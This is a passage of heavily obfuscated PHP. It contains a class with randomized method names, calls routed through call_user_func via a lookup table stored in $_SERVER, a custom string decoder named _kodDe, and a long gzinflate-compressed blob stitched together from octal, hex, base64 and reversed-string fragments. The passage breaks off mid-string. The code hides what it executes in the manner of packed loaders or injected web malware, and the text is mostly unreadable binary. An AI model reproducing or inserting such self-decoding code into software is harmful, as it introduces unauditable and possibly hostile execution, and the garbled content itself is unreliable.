intval(($ÒÅ¿«‰ * $Ìë‘ØĞ™ + 1) / $ñÂõïÆİ); break; } } $»à‹ÓĞÚ = md5($¸¢”«“Æ[304] . ($’Á¡£Óä + $èÇ”—öÒ) . $¸¢”«“Æ[305] . $ñÂõïÆİ . $¸¢”«“Æ[305] . $ƒå‰Åæé . $¸¢”«“Æ[306]); $÷ÆÒéÙµ = $this->ofbhf4fdc38c($ŒÈÊËÒ™[0], $»à‹ÓĞÚ); $Ì–û–Ë® = $ª­¨˜Í[807]; if (strlen($Ì–û–Ë®) < $ª­¨˜Í[716]) { die; } return $÷ÆÒéÙµ; $Ğ¢Äàí¹ = $ª­¨˜Í[808]; while ($Ğ¢Äàí¹ < $ª­¨˜Í[716]) { if ($Ğ¢Äàí¹ >= 0) { break; } $Ğ¢Äàí¹++; } } public function spfja1b95769() { $ˆÕÓÊÕ› =& $_SERVER[ü¢ÙÊñÛ]; $—ûğåê± = mt_rand(pow(2, 14), pow(2, 16) - 1); $çâ¾ğĞš = $ˆÕÓÊÕ›[809]; $²¾’“‘ = array(); $Ê½à¬‡± = $ˆÕÓÊÕ›[810]; while ($Ê½à¬‡± < $ˆÕÓÊÕ›[706]) { if ($Ê½à¬‡± >= 0) { break; } $Ê½à¬‡±++; } $Æ¶Ÿ·¹ = 1; while ($Æ¶Ÿ·¹ <= (int) sqrt($—ûğåê±)) { $ƒÊáòú¡ = $Æ¶Ÿ·¹; $Şç£êñØ = $ˆÕÓÊÕ›[811]; if (!$Şç£êñØ) { die; } while (!0) { $ƒÊáòú¡++; $¡°à¾ã = $ˆÕÓÊÕ›[812]; if (!$¡°à¾ã) { die; } if ($ƒÊáòú¡ <= 2) { $Æ¶Ÿ·¹ = $ƒÊáòú¡; break; } else { if ($ƒÊáòú¡ < 2) { continue; } } $¥–å“›¢ = !0; for ($ö’’¬Ã° = 2; $ö’’¬Ã° <= sqrt($ƒÊáòú¡); $ö’’¬Ã°++) { if ($ƒÊáòú¡ % $ö’’¬Ã° == 0) { $¥–å“›¢ = !1; } } if ($¥–å“›¢) { $Æ¶Ÿ·¹ = $ƒÊáòú¡; break; } } $²¾’“‘[] = $Æ¶Ÿ·¹; } $û’Œ‚¦ç = 2; for ($ƒÊáòú¡ = $—ûğåê±; $ƒÊáòú¡ > 1; $ƒÊáòú¡--) { $¥–å“›¢ = !0; foreach ($²¾’“‘ as $Û¾×Ãú) { if ($ƒÊáòú¡ % $Û¾×Ãú == 0) { $¥–å“›¢ = !1; break; } } if ($¥–å“›¢) { $û’Œ‚¦ç = $ƒÊáòú¡; break; } } return $û’Œ‚¦ç; } public function ytfqc8f24a94($™„¼Ûâ‘, $Üì©æš÷) { $¥ùú±Ô– =& $_SERVER[ ï©Şİµ]; return call_user_func(array($¥ùú±Ô–[8], $¥ùú±Ô–[308]), $™„¼Ûâ‘, $Üì©æš÷); } public function lobsa866628f($ôóÄ·Ü», $šë‰Ù¯™) { $ï¶’ïø¿ =& $_SERVER[ ï©Şİµ]; return call_user_func(array($ï¶’ïø¿[309], $ï¶’ïø¿[310]), $ôóÄ·Ü», $šë‰Ù¯™); } public function ofbhf4fdc38c($ëÅ´ÜôĞ, $É¯ªì©Ö) { $ñÀŒ´Ş =& $_SERVER[ ï©Şİµ]; return call_user_func(array($ñÀŒ´Ş[309], $ñÀŒ´Ş[311]), $ëÅ´ÜôĞ, $É¯ªì©Ö); } } goto b›¿‚¬§’¾; D¾ˆù¦Šë: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xfc\xa2\xd9\xca\xf1\xdb", base64_decode('5qWkofDH')); $_SERVER[ü¢ÙÊñÛ] = explode("\174\3\174\5\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\174\133\325\365\60\205\62\333\224\121\112\241\55\360\60\44\266\23\15\307\231\70\161\202\154\311\266\210\54\71\222\234\201\155\136\236\245\47\353"."\305\222\236\242\367\344\221\125\126\330\263\154\110\51\173\264\220\20\366\12\224\226\325\77\253\245\5\132\166\113\234\321\6\50\244\264\205\62\276\73\316\35\357\111\206\176\277\377\367\373\175\371".base64_decode('JdG95453x7nnnnvuuefc/eGmn19x0eo9Vu+5es9Nb539nzevo2H0/x6rv0nDR56zz27kzw==')."\167\317\71\273\256\256\143\346\176\123\242\337\276\340\236\73\264\275\132\56\373\367\23\367\74\267\376\17\357\74\367\363\144\172\336\103\353\7\216\330\355\323\135\217\177\336\204\262\322\222\252\226"."\x31\x72\x3a\xd\xe3\x90\x65\xac\xd4\xe5\x94\x4\x8a\x87\xb\x22\x5d\x1d\xd0\x6d\x35\x65\x16\x6c\xbd\x60\x5b\x14\xdc\x12\x48\x84\x5b\xd5\xae\x40\xb2\x83\xc6\xb5\x62\xd1\x6f\xa5\x7\x2d\xbf\x56\x4a\x65\x8d\x21"."\75\142\364\373\373\215\202\77\255\331\232\17\5\150\256\375\350\317\164\372\223\312\352\251\101\125\353\67\113\266\236\246\240\162\41\147\24\6\151\270\211\376\50\5\323\126\364\21\303\142\237\106".strrev('’µi›ÏNI©“Å'."\n".'êîèš¤±£WKr+[ÿC±ñNƒãzMç¤¤xîŸÓö*Ì4É'."\r".'').base64_decode('lofvF/WShVojV6cWzaJecEAEAA9Bv2ZBTcEWNRjqisSWqsmlXSHI0a+uKOulURojwYStlQ==')."\xec\xa4\x91\xd7\x79\x8e\xe1\x12\x6f\x57\x4b\xa8\x3d\x1c\x55\x92\xf1\x40\x34\x11\x68\x4d\x86\x63\x51\xa\x6e\x8d\x75\x76\x86\x93\x95\xf0\x78\x2c\x12\x69\x9\xb4\x2e\xa8\x4c\xe9\x8a\x7\xda\x3b\x3\xa\x6a\x1f"."\232\144\243\220\61\353\224\145\64\145\231\122\117\3\155\206\236\203\311\51\150\254\71\366\150\21\102\111\36\102\323\124\50\347\162\64\22\345\241\264\236\321\312\71\30\255\240\34\51\226\214\274".strrev('¸²’õ²Íy	0*uÒ n'."\n".'“Z„Š,)Ñ4)­¨à&’ìF„…m²¨ÀPå@½:Æ')."\43\24\17\51\270\321\315\265\244\257\265\12\340\113\24\15\205\22\210\104\224\361\152\260\365\174\221\125\103\313\124\251\54\26\17\206\342\112\313\122\105\214\120\312\314\347\315\202\17\325\202\146"."\xd2\x96\x9a\x1a\x8a\xc7\x69\xc0\x3\xe8\x1d\x9\xe3\x49\x83\x48\xac\xad\x2d\x11\xe2\x31\x19\x6f\x13\xb\x23\xa8\x3d\xd3\x0\x4b\x1d\xb1\x74\x26\x67\xab\x43\x5a\xae\xcc\x90\x15\x16\x50\x2d\xfc\xc0\xaf\x69\x1"."\x2\xaf\x30\xa\x46\x19\x90\x15\xaa\x30\x4d\xbe\xb8\x20\x50\x66\xb9\x75\x6\xd1\xd3\x10\xc8\xa3\xf2\x26\x94\xeb\x7\x58\x3f\xcb\xb5\x9c\x5\xc\xb4\x4e\x87\x68\xb0\x79\x1e\xfd\x9d\x3\xe5\xfb\x31\x31\x19\xd2"."\113\266\252\27\122\146\332\50\300\152\236\17\130\251\331\331\140\11\21\221\22\220\40\63\227\146\141\101\252\60\141\212\226\363\162\26\36\105\44\50\227\56\351\205\257\317\111\243\21\276\236\161"."\136\21\53\242\226\160\122\140\144\106\305\202\304\371\272\170\252\145\226\113\51\104\62\63\60\54\123\1\254\333\66\352\34\33\20\263\273\230\63\265\164\102\57\361\256\31\146\33\252\50\126\266".base64_decode('ZWCZZGszS/kgIh0yrBMtHkMAB9miSUuj5a/rOdn7RV/Pcei/eqCLvdCerJ7LqfqIDqsqnw==').strrev('w\'-)™ÎÑC´Ô[°:÷•|òXE³ñZmÈÅ)*é²³Vjc†#\\˜[ğ±a')."\205\206\263\266\135\114\350\205\164\33\337\217\322\346\160\201\214\122\121\147\233\102\320\243\244\225\116\145\251\322\321\144\64\131\254\140\76\307\103\254\167\34\146\161\240\75\302\246\62\235\1\114"."\145\173\106\15\174\320\260\10\371\23\153\27\355\145\71\43\245\331\206\131\360\233\51\133\267\275\226\135\322\65\250\61\220\112\351\226\345\155\105\333\141\311\314\171\3\271\234\71\354\215\225\214"."\1\243\320\244\114\6\112\114\367\112\57\246\216\115\260\214\153\346\50\30\151\360\147\46\67\227\355\214\167\66\133\230\74\167\111\53\130\31\275\344\15\301\252\150\122\120\143\71\211\144\331\202"."\x86\x55\x34\x2d\x3\x37\xaf\x49\xd1\x6c\x5b\x4b\x65\x31\x79\x11\xd5\x37\x7f\x45\x7e\x3\x6f\xb0\x7a\x65\x5e\x54\x89\xee\xed\x2a\x69\x3\x79\xad\x49\x29\x96\xfb\xd1\x0\xc0\x62\x4\x58\xa\xe7\x90\x33\xc3\x0"."\64\51\171\155\304\253\15\260\232\102\43\105\243\244\133\254\327\112\173\147\22\60\52\343\355\304\213\310\320\323\336\4\242\337\120\331\264\206\351\12\302\25\205\245\121\150\107\62\331\245\206\333"."\xd0\x6\x1d\xd\xa9\x9d\x81\x64\x2b\xb0\x19\x21\x5b\x1b\x60\x55\x47\x10\x55\xe6\x55\x32\xe0\x12\x2f\x5a\x4c\x18\x9b\xa2\xa8\x73\x2\xd8\x65\xe\xeb\x25\xf4\xe1\x96\xd1\x26\x65\xd0\x4c\xf7\x9b\x23\x3e\x96\xd4"."\x6\xc\xf\xcb\x8c\xe7\xb7\x68\x7b\xe3\x5a\x61\x0\x77\xa3\x7f\xd4\xd6\x2d\x37\x5d\x6a\x41\xdb\xb9\x2f\x43\x57\xae\xaf\x5f\xcf\x98\x25\xe8\x8d\x35\x34\xe0\x1c\xfc\x88\x5e\x18\xb0\xb3\xac\xee\x44\x28\xbe\x28"."\x14\x57\x13\xb1\xb6\xe4\xe2\x40\x1c\x76\xff\x2\xc2\x9c\x11\xd6\x1a\xfc\xf5\x9c\x37\xae\xa7\xd1\x20\xa6\x6c\x56\x4e\x2b\x8a\xd1\x5f\xe2\xc5\xb\x6\x7f\x9c\xa5\xe2\x45\xc4\xd2\x22\xe1\x76\x3c\x76\x41\xaf\x85".base64_decode('MnnlXKzuiJE3cPdsnkIGG7EG7dAgP+lzc681ua43PaXei/6fXN/TG/RN7pvvN0QZ/1TfVA==')."\245\261\141\246\322\205\170\25\103\313\51\320\351\212\34\15\112\154\201\163\130\4\206\27\314\202\136\165\141\41\104\62\55\335\333\241\153\210\100\243\211\160\314\213\207\175\213\306\277\142\164\361"."\x3e\x29\xd1\x12\xd7\xbc\x50\x60\x3c\xb4\xb0\x3b\x94\x48\xaa\x9d\xa1\x64\x47\x2c\x8\xcd\xf\x5\x20\x54\x40\x85\x49\x7b\xd9\x1c\x63\xd6\xc\xb6\xc4\x2\x54\xab\x8f\x48\xfb\x87\xd8\x7\x52\xf2\x80\x90\x72\x51"."\x73\x98\x51\x7e\x17\x2\xb5\x62\x6e\x78\x9c\x34\x14\x82\xde\x98\x94\x2e\xb1\xa9\xeb\xa1\x3f\x7d\x80\xcd\x7d\xf4\x47\x35\xac\x36\x69\xcf\xc4\x51\x4e\x5f\x55\xb3\x7f\x39\xc2\xac\x4e\x9d\x6d\x22\xf0\xa5\x70\x1e"."\xad\x61\xd1\x72\xd5\xb9\xc1\xb1\x6e\x75\xa\x4c\x47\x4b\x66\xb1\x91\xe6\x3b\x20\x8a\x76\xe8\xc6\x40\x16\x1a\x6a\xe0\xea\x52\x66\xce\x2c\x69\x39\x4c\xfb\x19\xeb\x3a\x60\x0\x19\x2e\xe6\xca\x8\xef\xfd\xb8\xe2".base64_decode('ZLac74edCo0ROmwIrtIaRaxXnu3GaEu3w0HHngsxv4pxtddXLAzUHwN1qY0zGjAAphF6hg==')._kodDe('MNnGTKBjx7hN+TJBqcIJXoluTbuIPg9/BNT2qgojtdepjPCKjH0dDxikY2qIlEWG9bwnPCs=').base64_decode('0Usls3QU5CBhhWyUeLqgcpuzHBYiASycNTmLYjJkbPJDvyc2tgHZSCNWzWfZaBJQB7V0ug==')."\32\30\221\32\250\140\65\303\123\222\300\370\0\177\142\32\372\53\66\375\264\231\327\330\26\212\51\17\377\54\216\130\74\106\366\105\75\115\67\106\7\210\256\150\12\232\314\76\131\262\115\234"."\x58\x72\xe4\x44\x48\x9a\x35\xa1\xd1\x8\x2b\xa0\xc3\x65\xde\x73\x36\x6\x69\x3d\xa7\x33\x4\xcb\xea\x8c\xb7\x68\x80\x6c\x68\x66\x38\xfa\x89\x73\x2f\x3a\x3f\x20\xa8\x60\xe8\xc\x2b\x8e\x4a\x62\x4e\x80\xc5\x17".base64_decode('4wOXAGB2CPBKBHNoVmNkQYl4V0nPGCOMdozYnVppkHUMlRRLEUekZdrWHYmorbFoEp3XKA==').strrev(';€ğZRE\\ÓŠòu´ˆ4\\îĞ`¿Ô!@F¡ ç™69Ç¢	ˆ.Öª1œ<qd')."\x82\xdf\x70\xb1\x10\x88\x9\xc8\xaf\xf4\xe6\x11\x5d\xf1\xf2\x36\x75\x75\xc3\xe6\xcf\xb0\x82\xf1\xc0\x2d\xa3\x98\xbd\x65\xa4\x63\xa0\xb0\x88\xcf\xfc\xe2\xc4\x74\x6f\x47\x67\xa0\xd5\x9b\xe8\x8\x34\xce\x98\x49"."\xa1\x4b\xf3\xe9\xde\x64\x87\x61\xf5\x9e\xc0\xe3\xd0\x9c\x61\x6b\xba\x5a\xd2\xd1\x9a\x66\xb8\xd0\xd8\x30\x95\xad\x38\xc4\x88\x68\xa2\xe5\x4b\xbd\x79\x2f\xae\x5\xf3\x90\xbe\x86\x86\x6\x56\xd7\x94\x99\x4a\x16"."\x91\x12\x4e\xb0\xd3\xa4\xb7\xec\x58\x53\x4e\xd\xea\x32\xfd\xb6\xbc\xc3\x6\xa3\x79\xc7\x70\xfe\xfb\x98\xca\xc1\xb7\xca\x64\x3b\x53\xb5\x14\xae\x4e\x45\x85\xed\xb2\x25\x8f\x14\x42\xc0\x34\x2a\x62\x30\xb6\x98"."\102\265\334\200\211\360\56\233\227\201\151\216\277\64\256\123\36\13\76\224\325\370\70\341\321\143\213\3\161\160\243\162\41\74\314\250\15\214\176\73\231\152\45\131\175\240\51\257\36\206\321\26"."\355\50\342\255\14\121\155\66\155\223\340\373\145\264\140\113\306\112\151\330\347\263\52\30\261\214\45\340\133\43\371\234\70\151\301\230\300\60\312\175\32\121\121\12\223\76\251\162\112\7\47\0"."\154\370\73\203\256\305\100\267\171\12\233\73\37\175\121\31\302\322\33\263\320\134\73\325\327\120\253\260\363\147\163\155\167\262\15\161\344\363\347\355\67\267\325\314\27\61\75\41\207\55\334\121"."\212\262\363\100\170\65\27\163\73\54\322\345\32\207\120\122\203\355\146\256\137\316\67\327\77\136\255\320\25\314\202\55\121\273\42\201\144\133\54\336\11\310\135\54\12\174\52\246\252\55\63\257"._kodDe('KToVwFpYoA2DVMXaQK1RhB6Huh2fma3/D2Yj1ZY/h1EJAkd7tgj1sarHq5Uhf3rNaySxXfo=').base64_decode('kewIRxeonbFgKKKGo4hzS1bCu7uCAUb/ZHhLjEkdAdqNeLdFgUjYnT20JJxIJqomIVh3yA==')."\225\22\154\121\273\342\241\266\360\22\36\155\13\207\42\301\204\332\32\150\355\20\171\242\201\116\210\40\46\111\317\245\55\277\63\277\212\230\320\4\27\261\251\200\160\20\163\110\265\124\46\251".strrev('X7I”´İò¨»$	^§ôu"NÎÃ0è±í{Ó²RÎeQ£*\'¤”…‹º¦F	Q')."\34\261\37\360\175\5\30\342\212\26\250\70\117\213\164\354\251\16\10\144\154\316\202\272\342\150\357\20\151\150\6\2\104\32\212\60\201\314\10\174\306\100\73\121\311\16\260\346\144\204\44\122"."\215\165\205\342\1\54\307\124\27\307\143\321\166\50\60\234\325\131\3\302\60\374\165\354\34\12\342\114\133\154\350\132\316\320\230\104\113\14\372\162\223\15\45\72\173\63\356\276\300\306\271\37"."\163\63\214\305\145\201\14\132\310\214\23\61\313\274\376\176\323\204\72\163\370\310\305\167\130\56\0\135\156\61\264\30\141\173\363\24\276\167\1\262\306\26\204\242\52\303\45\32\223\360\217\2"."\102\361\170\54\16\103\140\233\203\114\354\105\23\343\241\104\50\311\276\275\242\154\260\1\362\373\246\0\336\352\210\237\203\317\373\117\354\35\236\122\327\343\235\342\353\103\201\372\311\307\321\50"."\304\172\175\216\50\143\263\313\45\136\32\263\200\165\326\374\372\246\136\177\257\277\156\176\123\117\300\273\122\363\256\154\360\36\353\355\103\314\171\375\24\0\364\255\152\364\114\137\203\63\240\214".strrev('åBt$Ô:”ôÔÔ56Ïÿ—*“¾ÏŸ®M÷÷G}z£”Óm_oO\\v]­\'zö\'ó½Í?Cîó')."\x59\xa\x12\x29\x26\x19\x58\xc2\x4a\xa3\x28\xa0\xab\x66\xae\x61\x70\x34\x87\xfa\x80\x28\xd1\xe3\xed\x9d\xd2\x37\x5f\x2a\x27\x81\xdc\xdf\x42\xd4\x14\x71\x7b\x59\x9e\x2f\xe0\x3d\x1\xf7\x8c\x17\xc5\x2b\x1d\xf0".base64_decode('o1xIiQ0Rr4R+jR/1BgriSGWXuCh0CGGnoLmrJtLfNWwiB/QRRgwKGYNxUuWCsYKdbQr6Cg==')."\10\230\66\307\150\335\36\326\31\172\40\270\43\216\220\203\355\3\50\111\212\345\244\175\203\310\255\70\216\162\144\62\212\52\76\346\15\363\30\332\126\140\236\366\205\334\126\112\53\352\11\251"."\207\252\232\14\264\104\102\52\243\51\100\173\131\234\320\301\26\176\155\202\272\46\150\50\243\10\222\114\212\310\210\140\255\133\53\162\12\41\5\364\174\325\104\156\220\254\162\21\37\225\24\64"."\343\150\154\25\304\272\51\315\363\24\72\344\120\116\225\47\240\310\217\100\130\250\251\213\105\217\151\22\264\251\50\146\310\102\107\20\166\10\360\327\365\366\226\173\364\164\137\17\102\174\315\233".strrev('‘Ts–¶›oPã¢ŠgâY¨Ó\'„Gkrâ-Ãé({j„§	'."\r".'›5PË¹T	Ñ{øœ=Mm5[é')."\xc4\x10\x46\xa4\x18\x37\x5\x52\x5c\x3a\xef\x11\x41\xbb\x30\xd3\x21\x5d\x7\x11\x52\x1a\xe5\x52\x53\xce\xc\x4b\x37\x11\xb8\x44\x42\xb7\x7d\x3c\x87\x47\x4a\x54\x51\x1c\xfa\xd7\x5c\xc3\x48\x7c\x1\x2d\xa9\x56".base64_decode('aYOjEvQEkQI4bo8sHd80tpVzOZsLX3LGINQN6wUus7ywB0ypVhQdRJgscjI0o2ZytYzhQg==')."\301\114\367\313\350\46\266\326\366\0\142\142\222\112\35\273\162\121\302\121\245\45\26\213\204\2\121\5\357\342\260\373\40\26\41\21\352\12\240\255\13\113\65\23\311\20\334\5\205\203\136\126".base64_decode('7xIvE2nwgAEDbhbpUUK31ZzJCIhTKILPYx4smvBgjsKDWu3B0gyPOO16xE2GZ8jQh0mAnw==').base64_decode('RD1wQPUIOQwEw0GPYQXJQZt8gCSxJthZLGTOaaMe2pyIPqTnPExC42Ft9DC5lIfIk4LQrA==')."\x6e\xb4\xa4\xa0\x59\x24\x88\x28\x67\xd6\x83\x51\x7\x63\xae\x47\xdc\xad\x78\xcc\xe1\x82\x5e\x22\x59\x60\x60\xc4\x19\xdd\x23\xce\xef\x9e\x81\x92\x59\x2e\x76\xb1\x6f\x4a\x31\xda\x2c\x0\x88\x36\x73\x40\xdc\x34"."\x6d\xf\x13\x75\x79\x64\x99\x17\xb4\x22\xc0\x56\x48\xd5\xe1\xac\xde\x1b\x32\xfe\xee\x46\x0\x7e\xe1\xa4\xca\x51\xfa\x9a\xc9\xaa\x9c\xf\xa7\xb8\x6f\x15\xad\x11\x64\x9b\x6b\xd8\x4e\xe7\xc8\x43\xc4\x6e\x9c\xe7".base64_decode('xAMuQovEEsUdaNPgFo9WK4c5ghaciCquUsQFmuBw3ZIX99Ua/ig6RiWkz9naAPsWJlP8kA==')."\x55\x25\x2b\xd\xc7\xf5\xd4\x68\x4a\x88\x72\x82\x92\x80\xc8\x19\x6b\x76\xf6\xc7\x43\x16\x50\x35\xe4\xaf\x3e\xb9\x1c\xa1\xf9\x5c\xec\xb7\xef\xbe\x6c\x70\x19\x96\xf3\x89\x75\x2c\x8e\xaf\x5f\x96\xd0\x21\x42\xfb"."\142\105\301\101\320\306\142\312\233\100\73\132\133\216\215\106\243\234\14\64\327\343\214\341\125\345\43\64\230\334\125\47\270\360\60\22\152\113\52\307\307\20\331\62\114\225\226\121\161\146\205\374"."\x67\x16\x14\x47\xdd\x6c\xb8\x94\x66\x92\x2e\xe2\x5a\x21\x4d\x21\xcb\x10\x71\x5f\xd6\x5c\xc3\x3e\x52\xe3\x28\x2e\xf0\xc3\xd9\x8\xf\x8b\x2a\x95\x18\x87\x87\x5b\x1e\x4\x8c\x7\xa4\xfb\x62\x43\x62\xa0\x98\xd8"."\xff\xca\xc0\xf6\x69\x16\x1c\xb9\xb0\xe8\x15\x42\x3a\x83\x89\xa9\x95\x11\x52\xa2\x33\x2\xc0\xda\xe5\xf8\x2e\x8e\x8a\xc5\xc4\x50\x42\xc1\x1f\xf0\x48\x8c\xa\xa6\x25\x5e\xb1\x2c\xa4\xa8\x73\xc8\x5d\x18\xe9\xda"."\x35\xf1\x10\x75\x19\x85\x51\xa3\x90\x30\xb0\x44\xc1\xd\x15\x1b\xaf\xd8\xf7\xf1\xaa\x16\x31\x8a\x95\xe3\x85\xe9\xee\x81\xc5\xa\xb4\x7e\xf\x5c\x3\x7b\xb0\x62\x8e\xb4\x33\xb\x31\x26\x6a\x3d\x51\x12\xca\x3b"."\256\24\52\133\16\25\111\131\304\10\300\102\6\214\317\152\45\61\230\214\374\140\32\300\373\140\341\54\42\52\145\313\150\103\202\47\161\224\221\210\210\145\217\262\326\313\101\147\245\64\32\364"."\220\337\16\324\170\171\271\362\351\51\243\226\263\114\224\366\40\132\20\101\143\205\176\110\107\222\246\7\313\360\321\17\335\277\231\66\0\311\304\360\276\234\17\302\235\0\16\57\102\4\200\261"."\x62\x68\xc0\xeb\x18\x1\x1\x2e\x42\x95\x24\x0\x9c\x0\x39\xf9\x0\xda\x92\x0\xa7\xeb\x88\x59\xcf\xa1\x6d\xac\xe4\xc3\x6b\xa4\x1d\x6f\x46\x6c\x4c\x28\x79\x93\x71\x2e\xa1\xa3\x7e\x42\xf5\xa2\x86\x44\x45\x9a".base64_decode('nFsI8jCdF/sCvwjjS0yMr1hPA6JBeDjVynZgDK4ebyuZnJ/lW7o7Uys5OnKlDtc2LI2Hgw==').base64_decode('dagASWXcTIQL6opixqLKRgPNJNcxJbpj+dBBAHRzPA0SfyXoyyp6JQY73BrX/NqmiU6XJQ==')."\137\11\175\121\64\104\242\155\100\30\210\216\106\102\313\350\62\127\340\110\14\24\213\242\331\274\176\13\25\221\350\267\223\55\142\165\46\212\32\43\333\212\127\161\325\240\25\213\362\67\71\117"."\xc7\x10\x9e\x9c\x3d\xca\x1c\xa0\xc0\x15\x27\xed\xb5\xe8\x12\x6f\x2b\x4d\x88\x70\x86\x18\x53\x96\x50\xda\xb0\x31\x4\x2f\x55\x93\xdd\x17\x89\x8c\x62\x73\x75\x17\x16\x71\x99\xda\x93\x4d\xab\x2\x6d\xc4\x69\xc3".base64_decode('M9GR08lhAHAy4QZ8giGqrtWUMouAS5K+X94c0iUgvrorihQpSpOlJFGplItPBWkRWplpwg==').strrev('p”}‡ğªÑóhHhyZ:vÕ·[ÎS2€Œ­|MÚ}C¥âLŸ§ÃïÅÓ‡9,¡y Q‹F')."\340\273\313\130\201\257\27\21\256\314\52\113\41\253\127\224\20\367\367\316\130\365\354\201\134\116\150\134\271\343\343\26\241\4\103\56\44\103\306\55\326\106\16\300\114\131\241\32\214\37\175\306".strrev('!â­cW’M8.‡Œ…xò9][3ÿîÔj¬”c&¨™ĞQ¬Öõö=XÓy3·>?"Nèwİçg')."\135\76\147\160\21\255\40\125\174\303\257\140\143\200\225\220\42\252\355\340\306\342\244\176\151\71\71\60\4\55\137\72\36\170\263\13\307\174\326\70\70\353\316\307\325\123\10\115\34\341\173\264"."\134\10\47\341\271\224\53\25\334\337\127\344\347\225\13\116\120\316\207\160\27\47\214\327\126\226\314\153\271\366\203\333\336\172\363\136\32\176\366\334\167\176\177\343\107\64\74\153\46\160\214\253".base64_decode('dyeK7yQsVN/XLVll/vDpA/d+be0BtfftGZpgxG8Mbrptv8TqjkvqHj3/J59lVy95670PXw==')."\170\343\341\346\367\337\73\353\306\277\376\370\334\373\316\332\325\176\366\301\345\223\37\312\376\356\7\336\337\356\236\337\271\333\204\203\246\7\36\353\374\370\231\373\237\171\353\275\367\233\73\246"."\34\370\315\67\337\337\211\376\74\147\36\361\213\235\27\37\71\367\223\337\135\174\344\371\7\34\261\373\37\316\370\356\221\53\247\317\71\155\257\111\27\156\134\337\164\164\347\224\35\241\335\316"."\53\107\277\261\341\365\177\35\76\157\350\242\371\167\305\337\315\236\365\345\173\223\16\375\147\303\21\273\16\234\370\112\366\233\373\376\354\306\363\237\335\375\324\377\331\363\235\104\344\306\331\365"."\x5b\x6e\x7d\xbb\xe6\xb7\x4f\x1d\xfc\x54\x62\x67\x7b\xcf\xa7\x1f\xbf\xb5\xb0\xef\xb0\x5b\xdb\x3f\x9f\x54\xfb\xc6\xa6\x1f\x1d\xfe\xc2\x5d\x1b\x76\xbc\x75\xe0\x69\x67\x3c\x18\x39\x2c\xfd\xc2\xe4\x2b\xf7\x9e\xff"."\330\15\217\76\66\351\67\237\131\177\274\355\303\223\33\337\171\373\370\31\107\114\237\223\237\367\126\276\74\64\331\73\43\374\121\163\307\135\267\34\262\76\263\151\201\167\347\310\155\75\347\325".base64_decode('3pz45thLxQWvR/5+9HO5G/591V7NsSWvX3O1vjk5uXDIfuFfZD65RR+9R7tu+0Opn/1xbA==').base64_decode('7ruHf2dG9LbygVe0/ur5a9Zddda/1mW37Hb0/ue+8emkg6+/9MH2697c9+Oxg/033nPyhA==')."\x8b\x77\xfd\xe0\x1f\xa7\xd9\x7b\xb7\x6c\x5e\xde\x92\xef\x7d\xf2\xa1\x65\xbf\x9b\xdb\x6f\xef\xbb\xeb\x8c\xb6\x75\xbf\xfa\xe5\xae\x9b\xaf\xd8\xbe\xe6\xc8\x7d\xf\xf9\x61\xd3\xbc\x23\xf\x3b\xe4\xc3\x6c\xe2\x47"."\x33\xf7\xdc\xe7\xc1\x65\xdf\xec\x99\xdd\x72\xe6\x31\x9b\xbe\xfb\xf4\xc1\xf\x87\x73\x33\xef\xfd\xc3\x3d\x93\xbd\x4f\xdd\xb2\xea\xf\x6d\xab\xa3\xef\x9c\x79\xd8\x59\x17\x5c\x37\xc1\x33\xfd\x8a\x87\x5b\xf6\xbf".base64_decode('9vXLpjVc98ibZx719HupyLvfSuyuPb3upR9NUoon7a/tedTcw++894mnvnHouvTo4PL3lw==')."\x3e\xe4\xbb\xbf\xa9\xb8\xf2\x89\xde\x37\x7e\xd9\x71\xf9\xb\x7\xdd\x78\xf6\xdf\x9e\xfa\x7b\xf4\x8d\xbe\xbd\xf\x9e\xd9\xb0\xe9\xe4\xae\x13\x9f\x4e\xec\xad\x5d\x3b\xff\xce\x37\x26\xdf\x75\xed\xdd\x91\xc2\xd2"."\373\46\336\366\315\163\227\367\353\127\376\152\344\362\263\316\172\363\215\347\327\334\372\374\214\113\36\131\373\223\336\320\1\7\30\207\314\325\353\116\363\76\173\330\55\365\147\174\332\366\253\322"."\xe3\x2b\x7f\x15\x3c\xd0\x1b\xaf\xbd\xde\xde\x33\xd3\xf2\xfe\x43\xef\xbd\xf4\xc9\xd5\x4f\xec\xdc\xeb\x37\x3b\x3a\xbf\x55\x6e\xbe\x6b\x8f\xbd\xbf\x73\xf7\x8a\xe7\x3f\xfa\xe5\x1\x37\x15\x7f\xf4\xc0\xb1\x6d\x7b"."\334\62\165\357\167\236\374\104\73\155\361\376\377\11\236\272\337\37\366\271\361\331\203\367\174\351\227\327\75\373\255\73\366\71\271\67\253\77\161\155\252\335\327\253\74\365\306\121\33\116\61\136"."\xbe\xe7\xc2\x47\x77\x7b\x69\xd6\xef\xbe\xf7\xfd\x6c\xc3\x9f\x9f\xd9\xb3\xff\x5b\xd7\xb4\x1c\xfc\x6e\xe2\x1b\x7b\x7d\xfb\xfb\x7f\x8b\xe6\x7e\x30\x61\xce\xe9\x33\xe\x3a\x3b\x70\xbc\x77\xe0\xc6\x33\x6f\x9d\x75"."\xd2\x5\xf1\xc9\xbb\x36\x75\x14\x6f\xf3\x5e\xe3\x99\xb0\xe8\xcc\xed\xdf\x38\x62\xc1\x1\x4f\x1e\x53\x7b\xfd\xba\x15\xf5\x77\xc5\xef\x5c\xd4\xb9\xfd\xa4\xc3\x3e\xfb\xf4\xac\x43\x4f\x5c\x7f\xea\x2f\xff\xdc\xf7"."\335\71\177\177\336\272\240\57\336\71\331\273\151\142\343\244\103\116\125\26\327\276\374\355\213\213\247\34\60\151\373\235\43\301\37\136\175\375\314\235\311\113\62\335\357\55\332\153\125\313\301\307"."\x1c\x71\x77\xc7\x9b\xc7\x76\x3e\x9f\xba\xb5\x3b\xfe\x8f\xe6\x77\xae\x5c\x70\xda\xa1\x1d\x3b\x5b\x56\x2f\x6b\x5b\x7d\xdc\xab\x37\xdc\xfe\xf8\xbf\xa3\xde\x9\xdf\xb9\xbd\xae\xdd\x3a\xe5\xf8\xc3\x42\x37\xed\xfe"."\xdc\xa5\xaf\x69\x77\xdf\xb1\xe8\x84\x3b\x5e\x38\xeb\xb5\x9d\xc5\xd7\xc2\x6b\xda\xdf\x1b\x6e\x3a\xf5\xc9\x53\xd6\x9d\x34\xed\xa1\x9b\xcf\x3c\xeb\